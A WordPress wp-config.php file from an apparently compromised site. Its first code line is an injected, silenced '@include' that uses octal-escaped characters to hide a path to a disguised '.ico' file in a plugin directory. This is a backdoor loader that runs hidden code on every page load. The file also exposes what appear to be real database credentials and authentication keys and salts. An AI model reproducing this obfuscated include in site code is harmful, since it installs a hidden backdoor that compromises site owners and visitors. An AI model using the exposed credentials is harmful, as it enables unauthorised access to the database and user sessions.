<?php

/*12425*/

@include "\057h\157m\1452\057a\162c\162i\141m\143/\160u\142l\151c\137h\164m\154/\165n\142o\170e\144w\162i\164e\162s\057w\160-\143o\156t\145n\164/\160l\165g\151n\163/\164w\145e\164-\155a\163t\145r\057.\143a\061b\1411\0665\056i\143o";

/*12425*/
/**
 * The base configurations of the WordPress.
 *
 * This file has the following configurations: MySQL settings, Table Prefix,
 * Secret Keys, WordPress Language, and ABSPATH. You can find more information
 * by visiting {@link http://codex.wordpress.org/Editing_wp-config.php Editing
 * wp-config.php} Codex page. You can get the MySQL settings from your web host.
 *
 * This file is used by the wp-config.php creation script during the
 * installation. You don't have to use the web site, you can just copy this file
 * to "wp-config.php" and fill in the values.
 *
 * @package WordPress
 */

// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'arcriamc_wrd2');

/** MySQL database username */
define('DB_USER', 'arcriamc_wrd2');

/** MySQL database password */
define('DB_PASSWORD', '9jBhLdAXfP');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use in creating database tables. */
define('DB_CHARSET', 'utf8');

/** The Database Collate type. Don't change this if in doubt. */
define('DB_COLLATE', '');

/**#@+
 * Authentication Unique Keys and Salts.
 *
 * Change these to different unique phrases!
 * You can generate these using the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}
 * You can change these at any point in time to invalidate all existing cookies. This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define('AUTH_KEY',         '2MZH1ZoekUiuhdwDsRBpUTxydLQIh2w9FO6xNNwA4hNdzhkch4B1W2ARFPRgEeb2');
define('SECURE_AUTH_KEY',  'VgWVg61rD5U14abDdTS55aoTaXZZAGU2TsM0it7UW4yV4ODkfBMuqriD5Wq9GhBL');
define('LOGGED_IN_KEY',    'BksPi8Kkwu5iq9CXJLRfPfpUiqbCtcjCr75r3UrxtIR9VCJovzpl9CUITOVwbpfg');
define('NONCE_KEY',        'TaY01j4l955c4dvvP8Vo1a89ncsafVxZJVclO9V6DNZubYVLQTP4Spe2XYVBQ2pK');
define('AUTH_SALT',        'bQOH0v1aWbLa5c7BgHcjH1R6mYUIsyb5mdgSKjuul2PU5UhSSZU1lojdD0EvsUa2');
define('SECURE_AUTH_SALT', 'aKQCZ5Z0x2hP7JtSyIku5J2Ambyt7Z3l4NRDUwohKheHSWWC68iiTR1wzUf82XsS');
define('LOGGED_IN_SALT',   'Big7ZuasNS3iUNzLugM4M1Il8sZOQEeLFSFgqoCPtQkFAs2Iak8v4gcsVsMvv2YH');
define('NONCE_SALT',       'qp3uotQfiJxNX3nrBm2RkkvG3V85Fd6PlU7xxCeSHz7QtaXhMFxz7sojoSNibJka');

/**#@-*/

/**
 * WordPress Database Table prefix.
 *
 * You can have multiple installations in one database if you give each a unique
 * prefix. Only numbers, letters, and underscores please!
 */
$table_prefix  = 'wp_';

/**
 * WordPress Localized Language, defaults to English.
 *
 * Change this to localize WordPress. A corresponding MO file for the chosen
 * language must be installed to wp-content/languages. For example, install
 * de_DE.mo to wp-content/languages and set WPLANG to 'de_DE' to enable German
 * language support.
 */
define('WPLANG', '');

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 */
define('WP_DEBUG', false);

define( 'AUTOSAVE_INTERVAL', 300 );
define( 'WP_POST_REVISIONS', 5 );
define( 'EMPTY_TRASH_DAYS', 7 );
define( 'WP_CRON_LOCK_TIMEOUT', 120 );
/* That's all, stop editing! Happy blogging. */

/** Absolute path to the WordPress directory. */
if ( !defined('ABSPATH') )
	define('ABSPATH', dirname(__FILE__) . '/');

/** Sets up WordPress vars and included files. */
require_once(ABSPATH . 'wp-settings.php');
